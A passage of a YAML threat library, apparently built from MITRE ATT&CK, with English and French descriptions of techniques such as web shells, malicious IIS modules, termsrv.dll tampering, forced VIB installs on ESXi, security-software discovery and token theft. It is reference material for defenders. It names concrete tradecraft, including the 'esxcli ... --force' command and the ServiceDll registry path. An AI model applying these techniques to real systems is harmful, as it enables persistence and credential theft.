        name: Web Shell
        description: "Les adversaires peuvent utiliser des serveurs web d\xE9tourn\xE9\
          s avec des shell web pour \xE9tablir un acc\xE8s persistant aux syst\xE8\
          mes. Un shell Web est un script Web plac\xE9 sur un serveur Web ouvertement\
          \ accessible afin de permettre \xE0 un adversaire d\u2019acc\xE9der au serveur\
          \ Web comme une passerelle vers un r\xE9seau. Un shell Web peut fournir\
          \ un ensemble de fonctions \xE0 ex\xE9cuter ou une interface en ligne de\
          \ commande sur le syst\xE8me h\xE9bergeant le serveur Web. (Citation : volexity_0day_sophos_FW)\n\
          \nEn plus d\u2019un script c\xF4t\xE9 serveur, un shell Web peut avoir un\
          \ programme d\u2019interface client utilis\xE9 pour communiquer avec le\
          \ serveur Web (par exemple [China Chopper](https://attack.mitre.org/software/S0020)\
          \ client shell Web). (Citation : Lee 2013)\nhttps://attack.mitre.org/techniques/T1505/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.004
    ref_id: T1505.004
    name: IIS Components
    description: 'Adversaries may install malicious components that run on Internet
      Information Services (IIS) web servers to establish persistence. IIS provides
      several mechanisms to extend the functionality of the web servers. For example,
      Internet Server Application Programming Interface (ISAPI) extensions and filters
      can be installed to examine and/or modify incoming and outgoing IIS web requests.
      Extensions and filters are deployed as DLL files that export three functions:
      <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>,
      and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also
      be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension
      Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS
      Backdoor 2011)(Citation: Trustwave IIS Module 2013)


      Adversaries may install malicious ISAPI extensions and filters to observe and/or
      modify traffic, execute commands on compromised machines, or proxy command and
      control traffic. ISAPI extensions and filters may have access to all IIS web
      requests and responses. For example, an adversary may abuse these mechanisms
      to modify HTTP responses in order to distribute malicious commands/content to
      previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation:
      Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension
      All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation:
      MMPC ISAPI Filter 2012)


      Adversaries may also install malicious IIS modules to observe and/or modify
      traffic. IIS 7.0 introduced modules that provide the same unrestricted access
      to HTTP requests and responses as ISAPI extensions and filters. IIS modules
      can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET
      application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation:
      Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation:
      ESET IIS Malware 2021)

      https://attack.mitre.org/techniques/T1505/004'
    translations:
      fr:
        name: "Composants de l\u2019IIS"
        description: "Les adversaires peuvent installer des composants malveillants\
          \ qui fonctionnent sur des serveurs web des services d\u2019information\
          \ Internet (IIS) pour \xE9tablir la persistance. IIS fournit plusieurs m\xE9\
          canismes pour \xE9tendre la fonctionnalit\xE9 des serveurs web. Par exemple,\
          \ des extensions et filtres de l\u2019Internet Server Application Programming\
          \ Interface (ISAPI) peuvent \xEAtre install\xE9s pour examiner et/ou modifier\
          \ les requ\xEAtes web IIS entrantes et sortantes. Les extensions et filtres\
          \ sont d\xE9ploy\xE9s sous forme de fichiers DLL qui exportent trois fonctions\
          \ : <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>,\
          \ et (optionnellement) <code>Terminate{Extension/Filter}</code>. Des modules\
          \ IIS peuvent \xE9galement \xEAtre install\xE9s pour \xE9tendre les serveurs\
          \ web IIS. (Citation : Aper\xE7u de l\u2019extension Microsoft ISAPI 2017)(Citation\
          \ : Aper\xE7u du filtre Microsoft ISAPI 2017)(Citation : IIS Backdoor 2011)(Citation\
          \ : Module Trustwave IIS 2013)\n\nLes adversaires peuvent installer des\
          \ extensions ISAPI malveillantes et des filtres pour observer et/ou modifier\
          \ le trafic, ex\xE9cuter des commandes sur des machines compromises, ou\
          \ proxy le trafic de commande et de contr\xF4le. Les extensions et filtres\
          \ ISAPI peuvent avoir acc\xE8s \xE0 toutes les requ\xEAtes et r\xE9ponses\
          \ web de l\u2019IIS. Par exemple, un adversaire peut abuser de ces m\xE9\
          canismes pour modifier les r\xE9ponses HTTP afin de distribuer des commandes/contenus\
          \ malveillants aux h\xF4tes pr\xE9c\xE9demment compos\xE9s. (Citation :\
          \ Aper\xE7u du filtre Microsoft ISAPI 2017)(Citation : Aper\xE7u de l\u2019\
          extension Microsoft ISAPI 2017)(Citation : Microsoft ISAPI Extension Toutes\
          \ \xE0 venir 2017)(Citation : Dell TG-3390)(Citation : Module Trustwave\
          \ IIS 2013)(Citation : MMPC ISAPI Filter 2012)\n\nLes adversaires peuvent\
          \ \xE9galement installer des modules IIS malveillants pour observer et/ou\
          \ modifier le trafic. IIS 7.0 a introduit des modules offrant le m\xEAme\
          \ acc\xE8s illimit\xE9 aux requ\xEAtes et r\xE9ponses HTTP que les extensions\
          \ et filtres ISAPI. Les modules IIS peuvent \xEAtre \xE9crits sous forme\
          \ de DLL qui exporte <code>RegisterModule</code>, ou comme une application\
          \ .NET qui interagit avec ASP.NET API pour acc\xE9der aux requ\xEAtes HTTP\
          \ IIS. (Citation : Aper\xE7u des modules Microsoft IIS 2007)(Citation :\
          \ Module Trustwave IIS 2013)(Citation : ESET IIS Malware 2021)\nhttps://attack.mitre.org/techniques/T1505/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.005
    ref_id: T1505.005
    name: Terminal Services DLL
    description: 'Adversaries may abuse components of Terminal Services to enable
      persistent access to systems. Microsoft Terminal Services, renamed to Remote
      Desktop Services in some Windows Server OSs as of 2022, enable remote terminal
      connections to hosts. Terminal Services allows servers to transmit a full, interactive,
      graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop
      Services)


      [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run
      as a "generic" process (ex: <code>svchost.exe</code>) load the service''s DLL
      file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation:
      Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically
      stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value
      for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.


      Adversaries may modify and/or replace the Terminal Services DLL to enable persistent
      access to victimized hosts.(Citation: James TermServ DLL) Modifications to this
      DLL could be done to execute arbitrary payloads (while also potentially preserving
      normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable
      features of Terminal Services. For example, an adversary may enable features
      such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      sessions by either patching the <code>termsrv.dll</code> file or modifying the
      <code>ServiceDll</code> value to point to a DLL that provides increased RDP
      functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a
      non-server Windows OS this increased functionality may also enable an adversary
      to avoid Terminal Services prompts that warn/log out users of a system when
      a new RDP session is created.

      https://attack.mitre.org/techniques/T1505/005'
    translations:
      fr:
        name: DLL des services terminaux
        description: "Les adversaires peuvent abuser des composants des services terminaux\
          \ pour permettre un acc\xE8s persistant aux syst\xE8mes. Microsoft Terminal\
          \ Services, renomm\xE9 Remote Desktop Services dans certains syst\xE8mes\
          \ d\u2019exploitation Windows Server depuis 2022, permet les connexions\
          \ de terminal distantes vers des h\xF4tes. Terminal Services permet aux\
          \ serveurs de transmettre une interface graphique interactive compl\xE8\
          te aux clients via RDP. (Citation : Services de bureau \xE0 distance Microsoft)\n\
          \n[Service Windows](https://attack.mitre.org/techniques/T1543/003) ex\xE9\
          cut\xE9s comme un processus \xAB g\xE9n\xE9rique \xBB (ex : <code>svchost.exe</code>)\
          \ chargent le fichier DLL du service, dont l\u2019emplacement est stock\xE9\
          \ dans une entr\xE9e du registre <code>nomm\xE9e ServiceDll</code>. (Citation\
          \ : Fondamentaux des services syst\xE8me Microsoft) Le <code>fichier termsrv.dll</code>,\
          \ g\xE9n\xE9ralement stock\xE9 dans '\_%SystemRoot\_%\\System32\\', est\
          \ la valeur par d\xE9faut <code>de ServiceDll</code> pour les services terminaux\
          \ dans 'HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\\
          '.\n\nLes adversaires peuvent modifier et/ou remplacer la DLL des Services\
          \ Terminaux pour permettre un acc\xE8s persistant aux h\xF4tes victimes.\
          \ (Citation : James TermServ DLL) Des modifications de cette DLL pourraient\
          \ \xEAtre effectu\xE9es pour ex\xE9cuter des charges utiles arbitraires\
          \ (tout en pr\xE9servant potentiellement les fonctionnalit\xE9s <code>normales\
          \ de termsrv.dll</code>) ainsi que pour simplement activer des fonctionnalit\xE9\
          s abusables des services terminaux. Par exemple, un adversaire peut activer\
          \ des fonctionnalit\xE9s telles que des sessions concurrentes [Remote Desktop\
          \ Protocol](https://attack.mitre.org/techniques/T1021/001) soit en corrigeant\
          \ le fichier <code>termsrv.dll</code> soit en modifiant la <code>valeur\
          \ ServiceDll</code> pour pointer vers une DLL offrant une fonctionnalit\xE9\
          \ RDP accrue. (Citation : RDP du hub Windows OS)(Citation : RDPWrap Github)\
          \ Sur un syst\xE8me Windows non-serveur, cette fonctionnalit\xE9 accrue\
          \ peut \xE9galement permettre \xE0 un adversaire d\u2019\xE9viter les demandes\
          \ de services terminaux qui avertissent ou d\xE9connectent les utilisateurs\
          \ d\u2019un syst\xE8me lorsqu\u2019une nouvelle session RDP est cr\xE9\xE9\
          e.\nhttps://attack.mitre.org/techniques/T1505/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.006
    ref_id: T1505.006
    name: vSphere Installation Bundles
    description: "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish\
      \ persistent access to ESXi hypervisors. VIBs are collections of files used\
      \ for software distribution and virtual system management in VMware environments.\
      \ Since ESXi uses an in-memory filesystem where changes made to most files are\
      \ stored in RAM rather than in persistent storage, these modifications are lost\
      \ after a reboot. However, VIBs can be used to create startup tasks, apply custom\
      \ firewall rules, or deploy binaries that persist across reboots. Typically,\
      \ administrators use VIBs for updates and system maintenance.\n\nVIBs can be\
      \ broken down into three components:(Citation: VMware VIBs)\n\n* VIB payload:\
      \ a `.vgz` archive containing the directories and files to be created and executed\
      \ on boot when the VIBs are loaded.  \n* Signature file: verifies the host acceptance\
      \ level of a VIB, indicating what testing and validation has been done by VMware\
      \ or its partners before publication of a VIB. By default, ESXi hosts require\
      \ a minimum acceptance level of PartnerSupported for VIB installation, meaning\
      \ the VIB is published by a trusted VMware partner. However, privileged users\
      \ can change the default acceptance level using the `esxcli` command line interface.\
      \ Additionally, VIBs are able to be installed regardless of acceptance level\
      \ by using the <code> esxcli software vib install --force</code> command. \n\
      * XML descriptor file: a configuration file containing associated VIB metadata,\
      \ such as the name of the VIB and its dependencies.  \n\nAdversaries may leverage\
      \ malicious VIB packages to maintain persistent access to ESXi hypervisors,\
      \ allowing system changes to be executed upon each bootup of ESXi \u2013 such\
      \ as using  `esxcli` to enable firewall rules for backdoor traffic, creating\
      \ listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud\
      \ Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their\
      \ malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation:\
      \ Google Cloud Threat Intelligence ESXi VIBs 2022)\nhttps://attack.mitre.org/techniques/T1505/006"
    translations:
      fr:
        name: "Ensembles d\u2019installation vSphere"
        description: "Les adversaires peuvent abuser des vSphere Installation Bundles\
          \ (VIBs) pour \xE9tablir un acc\xE8s persistant aux hyperviseurs ESXi. Les\
          \ VIB sont des collections de fichiers utilis\xE9es pour la distribution\
          \ de logiciels et la gestion de syst\xE8mes virtuels dans les environnements\
          \ VMware. Comme ESXi utilise un syst\xE8me de fichiers en m\xE9moire o\xF9\
          \ les modifications apport\xE9es \xE0 la plupart des fichiers sont stock\xE9\
          es en RAM plut\xF4t que dans un stockage persistant, ces modifications sont\
          \ perdues apr\xE8s un red\xE9marrage. Cependant, les VIB peuvent \xEAtre\
          \ utilis\xE9s pour cr\xE9er des t\xE2ches de d\xE9marrage, appliquer des\
          \ r\xE8gles de pare-feu personnalis\xE9es ou d\xE9ployer des binaires qui\
          \ persistent lors des red\xE9marrages. En g\xE9n\xE9ral, les administrateurs\
          \ utilisent les VIB pour les mises \xE0 jour et la maintenance syst\xE8\
          me.\n\nLes VIB peuvent \xEAtre d\xE9compos\xE9s en trois composantes : (Citation\
          \ : VMware VIBs)\n\n* Charge utile VIB : une archive \xAB .vgz \xBB contenant\
          \ les r\xE9pertoires et fichiers \xE0 cr\xE9er et ex\xE9cuter au d\xE9marrage\
          \ lors du chargement des VIB.  \n* Fichier signature : v\xE9rifie le niveau\
          \ d\u2019acceptation de l\u2019h\xF4te d\u2019un VIB, indiquant quels tests\
          \ et validations ont \xE9t\xE9 effectu\xE9s par VMware ou ses partenaires\
          \ avant la publication d\u2019un VIB. Par d\xE9faut, les h\xF4tes ESXi n\xE9\
          cessitent un niveau minimum d\u2019acceptation de PartnerSupported pour\
          \ l\u2019installation VIB, ce qui signifie que le VIB est publi\xE9 par\
          \ un partenaire VMware de confiance. Cependant, les utilisateurs privil\xE9\
          gi\xE9s peuvent modifier le niveau d\u2019acceptation par d\xE9faut via\
          \ l\u2019interface en ligne de commande 'esxcli'. De plus, les VIB peuvent\
          \ \xEAtre install\xE9s quel que soit leur niveau d\u2019acceptation en utilisant\
          \ la commande <code> esxcli vib install --force</code>. \n* Fichier descripteur\
          \ XML : un fichier de configuration contenant les m\xE9tadonn\xE9es associ\xE9\
          es du VIB, telles que le nom du VIB et ses d\xE9pendances.  \n\nLes adversaires\
          \ peuvent exploiter des packages VIB malveillants pour maintenir un acc\xE8\
          s persistant aux hyperviseurs ESXi, permettant d\u2019ex\xE9cuter des modifications\
          \ syst\xE8me \xE0 chaque d\xE9marrage d\u2019ESXi \u2013 comme l\u2019utilisation\
          \ d''esxcli' pour activer les r\xE8gles de pare-feu pour le trafic backdoor,\
          \ la cr\xE9ation d\u2019auditeurs sur des ports cod\xE9s en dur, et l\u2019\
          ex\xE9cution de backdoors. (Citation : Google Cloud Threat Intelligence\
          \ ESXi VIBs 2022) Les adversaires peuvent \xE9galement faire passer leurs\
          \ fichiers VIB malveillants en PartnerSupported en modifiant le fichier\
          \ descripteur XML. (Citation : Google Cloud Threat Intelligence ESXi VIBs\
          \ 2022)\nhttps://attack.mitre.org/techniques/T1505/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1518
    ref_id: T1518
    name: Software Discovery
    description: 'Adversaries may attempt to get a listing of software and software
      versions that are installed on a system or in a cloud environment. Adversaries
      may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Such software may be deployed widely across the environment for configuration
      management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072),
      and may allow adversaries broad access to infect devices or move laterally.


      Adversaries may attempt to enumerate software for a variety of reasons, such
      as figuring out what security measures are present or if the compromised system
      has a version of software that is vulnerable to [Exploitation for Privilege
      Escalation](https://attack.mitre.org/techniques/T1068).'
    translations:
      fr:
        name: "D\xE9couverte de logiciels"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ logiciels et des versions de logiciels install\xE9s sur un syst\xE8me\
          \ ou dans un environnement cloud. Les adversaires peuvent utiliser les informations\
          \ de [D\xE9couverte logicielle](https://attack.mitre.org/techniques/T1518)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques.\n\nDe tels logiciels peuvent \xEA\
          tre d\xE9ploy\xE9s largement dans l\u2019environnement pour des raisons\
          \ de gestion de configuration ou de s\xE9curit\xE9, tels que les [Outils\
          \ de d\xE9ploiement logiciel](https://attack.mitre.org/techniques/T1072),\
          \ et peuvent permettre aux adversaires d\u2019avoir un acc\xE8s large aux\
          \ dispositifs infect\xE9s ou de se d\xE9placer lat\xE9ralement.\n\nLes adversaires\
          \ peuvent tenter d\u2019\xE9num\xE9rer les logiciels pour diverses raisons,\
          \ comme d\xE9terminer quelles mesures de s\xE9curit\xE9 sont pr\xE9sentes\
          \ ou si le syst\xE8me compromis poss\xE8de une version du logiciel vuln\xE9\
          rable \xE0 [exploitation pour escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1518.001
    ref_id: T1518.001
    name: Security Software Discovery
    description: 'Adversaries may attempt to get a listing of security software, configurations,
      defensive tools, and sensors that are installed on a system or in a cloud environment.
      This may include things such as cloud monitoring agents and anti-virus. Adversaries
      may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Example commands that can be used to obtain security software information are
      [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with
      [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106),
      and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators
      of discovery behavior may be more specific to the type of software or security
      system the adversary is looking for. It is becoming more common to see macOS
      malware perform checks for LittleSnitch and KnockKnock software.


      Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009)
      to discover cloud-native security software installed on compute infrastructure,
      such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent.
      These agents  may collect  metrics and logs from the VM, which may be centrally
      aggregated in a cloud-based monitoring platform.'
    translations:
      fr:
        name: "D\xE9couverte de logiciels de s\xE9curit\xE9"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ logiciels de s\xE9curit\xE9, des configurations, des outils d\xE9fensifs\
          \ et des capteurs install\xE9s sur un syst\xE8me ou dans un environnement\
          \ cloud. Cela peut inclure des \xE9l\xE9ments tels que des agents de surveillance\
          \ cloud et des antivirus. Les adversaires peuvent utiliser les informations\
          \ issues de [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques.\n\nDes commandes exemples pouvant\
          \ \xEAtre utilis\xE9es pour obtenir des informations sur les logiciels de\
          \ s\xE9curit\xE9 sont [netsh](https://attack.mitre.org/software/S0108),\
          \ <code>requ\xEAte de r\xE9gulation</code> avec [Reg](https://attack.mitre.org/software/S0075),\
          \ <code>dir</code> avec [cmd](https://attack.mitre.org/software/S0106) et\
          \ [Liste des t\xE2ches](https://attack.mitre.org/software/S0057), mais d\u2019\
          autres indicateurs du comportement de d\xE9couverte peuvent \xEAtre plus\
          \ sp\xE9cifiques au type de logiciel ou de syst\xE8me de s\xE9curit\xE9\
          \ recherch\xE9 par l\u2019adversaire. Il devient de plus en plus courant\
          \ de voir des malwares sur macOS effectuer des v\xE9rifications pour les\
          \ logiciels LittleSnitch et KnockKnock.\n\nLes adversaires peuvent \xE9\
          galement utiliser l'[API cloud](https://attack.mitre.org/techniques/T1059/009)\
          \ pour d\xE9couvrir des logiciels de s\xE9curit\xE9 natifs-cloud install\xE9\
          s sur l\u2019infrastructure de calcul, tels que l\u2019agent AWS CloudWatch,\
          \ Azure VM Agent et Google Cloud Monitor. Ces agents peuvent collecter des\
          \ m\xE9triques et des journaux \xE0 partir de la VM, qui peuvent \xEAtre\
          \ agr\xE9g\xE9s centralis\xE9ment dans une plateforme de surveillance bas\xE9\
          e sur le cloud."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1518.002
    ref_id: T1518.002
    name: Backup Software Discovery
    description: "Adversaries may attempt to get a listing of backup software or configurations\
      \ that are installed on a system. Adversaries may use this information to shape\
      \ follow-on behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485),\
      \ [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), or [Data\
      \ Encrypted for Impact](https://attack.mitre.org/techniques/T1486).  \n\nCommands\
      \ that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108),\
      \ `reg query` with [Reg](https://attack.mitre.org/software/S0075), `dir` with\
      \ [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057),\
      \ but other indicators of discovery behavior may be more specific to the type\
      \ of software or security system the adversary is looking for, such as Veeam,\
      \ Acronis, Dropbox, or Paragon.(Citation: Symantec Play Ransomware 2023)\nhttps://attack.mitre.org/techniques/T1518/002"
    translations:
      fr:
        name: "D\xE9couverte des logiciels de sauvegarde"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste de logiciels\
          \ ou configurations de sauvegarde install\xE9s sur un syst\xE8me. Les adversaires\
          \ peuvent utiliser ces informations pour fa\xE7onner des comportements ult\xE9\
          rieurs, tels que [Destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485),\
          \ [Inhiber la r\xE9cup\xE9ration du syst\xE8me](https://attack.mitre.org/techniques/T1490)\
          \ ou [Donn\xE9es chiffr\xE9es pour l\u2019impact](https://attack.mitre.org/techniques/T1486).\
          \  \n\nLes commandes pouvant \xEAtre utilis\xE9es pour obtenir des informations\
          \ logicielles de s\xE9curit\xE9 sont [netsh](https://attack.mitre.org/software/S0108),\
          \ \xAB reg query \xBB avec [Reg](https://attack.mitre.org/software/S0075),\
          \ \xAB dir \xBB avec [cmd](https://attack.mitre.org/software/S0106), et\
          \ [Tasklist](https://attack.mitre.org/software/S0057), mais d\u2019autres\
          \ indicateurs de comportement de d\xE9couverte peuvent \xEAtre plus sp\xE9\
          cifiques au type de logiciel ou de syst\xE8me de s\xE9curit\xE9 recherch\xE9\
          \ par l\u2019adversaire, tels que Veeam, Acronis, Dropbox ou Paragon. (Citation\
          \ : Symantec Play Ransomware 2023)\nhttps://attack.mitre.org/techniques/T1518/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1525
    ref_id: T1525
    name: Implant Internal Image
    description: "Adversaries may implant cloud or container images with malicious\
      \ code to establish persistence after gaining access to an environment. Amazon\
      \ Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP)\
      \ Images, and Azure Images as well as popular container runtimes such as Docker\
      \ can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001),\
      \ this technique focuses on adversaries implanting an image in a registry within\
      \ a victim\u2019s environment. Depending on how the infrastructure is provisioned,\
      \ this could provide persistent access if the infrastructure provisioning tool\
      \ is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image\
      \ Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting\
      \ backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September\
      \ 2019) If an adversary has access to a compromised AWS instance, and permissions\
      \ to list the available container images, they may implant a backdoor such as\
      \ a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino\
      \ Labs Cloud Image Backdoor Technique Sept 2019)\nhttps://attack.mitre.org/techniques/T1525"
    translations:
      fr:
        name: "Image interne de l\u2019implant"
        description: "Les adversaires peuvent implanter des images cloud ou conteneurs\
          \ avec un code malveillant afin d\u2019\xE9tablir la persistance apr\xE8\
          s avoir acc\xE9d\xE9 \xE0 un environnement. Amazon Web Services (AWS), Amazon\
          \ Machine Images (AMI), Google Cloud Platform (GCP) Images et Azure Images\
          \ ainsi que des environnements d\u2019ex\xE9cution populaires comme Docker\
          \ peuvent \xEAtre implant\xE9s ou d\xE9rob\xE9s. Contrairement \xE0 [Upload\
          \ Malware](https://attack.mitre.org/techniques/T1608/001), cette technique\
          \ se concentre sur les adversaires implantant une image dans un registre\
          \ dans l\u2019environnement de la victime. Selon la mani\xE8re dont l\u2019\
          infrastructure est provisionn\xE9e, cela peut fournir un acc\xE8s persistant\
          \ si l\u2019outil de provisionnement de l\u2019infrastructure est instruit\
          \ \xE0 utiliser toujours la derni\xE8re image. (Citation : Technique de\
          \ la porte d\xE9rob\xE9e d\u2019images nuages de Rhino Labs sept. 2019)\n\
          \nUn outil a \xE9t\xE9 d\xE9velopp\xE9 pour faciliter la plantation de portes\
          \ d\xE9rob\xE9es dans des images de contenants nuages. (Citation : Rhino\
          \ Labs Cloud Backdoor septembre 2019) Si un adversaire a acc\xE8s \xE0 une\
          \ instance AWS compromise et des autorisations pour lister les images du\
          \ conteneur disponibles, il peut implanter une porte d\xE9rob\xE9e telle\
          \ qu\u2019un [Web Shell](https://attack.mitre.org/techniques/T1505/003).\
          \ (Citation : Technique de la porte d\xE9rob\xE9e d\u2019images nuages de\
          \ Rhino Labs sept. 2019)\nhttps://attack.mitre.org/techniques/T1525"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1526
    ref_id: T1526
    name: Cloud Service Discovery
    description: 'An adversary may attempt to enumerate the cloud services running
      on a system after gaining access. These methods can differ from platform-as-a-service
      (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS).
      Many services exist throughout the various cloud providers and can include Continuous
      Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc.
      They may also include security services, such as AWS GuardDuty and Microsoft
      Defender for Cloud, and logging services, such as AWS CloudTrail and Google
      Cloud Audit Logs.


      Adversaries may attempt to discover information about the services enabled throughout
      the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure
      Resource Manager API, can enumerate resources and services, including applications,
      management groups, resources and policy definitions, and their relationships
      that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation:
      Azure AD Graph API)


      For example, Stormspotter is an open source tool for enumerating and constructing
      a graph for Azure resources and services, and Pacu is an open source AWS exploitation
      framework that supports several methods for discovering cloud services.(Citation:
      Azure - Stormspotter)(Citation: GitHub Pacu)


      Adversaries may use the information gained to shape follow-on behaviors, such
      as targeting data or credentials from enumerated services or evading identified
      defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685)
      or [Disable or Modify Cloud Log](https://attack.mitre.org/techniques/T1685/002).

      https://attack.mitre.org/techniques/T1526'
    translations:
      fr:
        name: "D\xE9couverte des services cloud"
        description: "Un adversaire peut tenter d\u2019\xE9num\xE9rer les services\
          \ cloud fonctionnant sur un syst\xE8me apr\xE8s avoir obtenu l\u2019acc\xE8\
          s. Ces m\xE9thodes peuvent varier de plateforme en tant que service (PaaS),\
          \ d\u2019infrastructure en tant que service (IaaS) ou de logiciel en tant\
          \ que service (SaaS). De nombreux services existent parmi les diff\xE9rents\
          \ fournisseurs cloud et peuvent inclure l\u2019int\xE9gration continue et\
          \ la livraison continue (CI/CD), les fonctions Lambda, l\u2019ID Entra,\
          \ etc. Ils peuvent \xE9galement inclure des services de s\xE9curit\xE9,\
          \ tels qu\u2019AWS GuardDuty et Microsoft Defender for Cloud, ainsi que\
          \ des services de journalisation, tels qu\u2019AWS CloudTrail et Google\
          \ Cloud Audit Logs.\n\nLes adversaires peuvent tenter de d\xE9couvrir des\
          \ informations sur les services activ\xE9s dans l\u2019environnement. Les\
          \ outils et API Azure, tels que Microsoft Graph API et Azure Resource Manager,\
          \ peuvent \xE9num\xE9rer les ressources et services, y compris les applications,\
          \ les groupes de gestion, les ressources et les d\xE9finitions de politiques,\
          \ ainsi que leurs relations accessibles par une identit\xE9. (Citation :\
          \ Azure - API du gestionnaire de ressources)(Citation : API Azure AD Graph)\n\
          \nPar exemple, Stormspotter est un outil open source pour \xE9num\xE9rer\
          \ et construire un graphe pour les ressources et services Azure, et Pacu\
          \ est un cadre d\u2019exploitation AWS open source qui prend en charge plusieurs\
          \ m\xE9thodes pour d\xE9couvrir les services cloud. (Citation : Azure -\
          \ Stormspotter)(Citation : GitHub Pacu)\n\nLes adversaires peuvent utiliser\
          \ les informations obtenues pour fa\xE7onner des comportements ult\xE9rieurs,\
          \ tels que le ciblage de donn\xE9es ou d\u2019identifiants provenant de\
          \ services \xE9num\xE9r\xE9s ou l\u2019\xE9vitement de d\xE9fenses identifi\xE9\
          es via [D\xE9sactiver ou modifier les outils](https://attack.mitre.org/techniques/T1685)\
          \ ou [D\xE9sactiver ou modifier le journal cloud](https://attack.mitre.org/techniques/T1685/002).\n\
          https://attack.mitre.org/techniques/T1526"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1528
    ref_id: T1528
    name: Steal Application Access Token
    description: "Adversaries can steal application access tokens as a means of acquiring\
      \ credentials to access remote systems and resources.\n\nApplication access\
      \ tokens are used to make authorized API requests on behalf of a user or service\
      \ and are commonly used as a way to access resources in cloud and container-based\
      \ applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should\
      \ Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal\
      \ account API tokens in cloud and containerized environments may be able to\
      \ access data and perform actions with the permissions of these accounts, which\
      \ can lead to privilege escalation and further compromise of the environment.\n\
      \nFor example, in Kubernetes environments, processes running inside a container\
      \ may communicate with the Kubernetes API server using service account tokens.\
      \ If a container is compromised, an adversary may be able to steal the container\u2019\
      s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes\
      \ Service Accounts)  \n\nSimilarly, instances within continuous-development\
      \ / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate\
      \ to other services for testing and deployment.(Citation: Cider Security Top\
      \ 10 CICD Security Risks) If these pipelines are compromised, adversaries may\
      \ be able to steal these tokens and leverage their privileges. \n\nIn Azure,\
      \ an adversary who compromises a resource with an attached Managed Identity,\
      \ such as an Azure VM, can request short-lived tokens through the Azure Instance\
      \ Metadata Service (IMDS). These tokens can then facilitate unauthorized actions\
      \ or further access to other Azure services, bypassing typical credential-based\
      \ authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps\
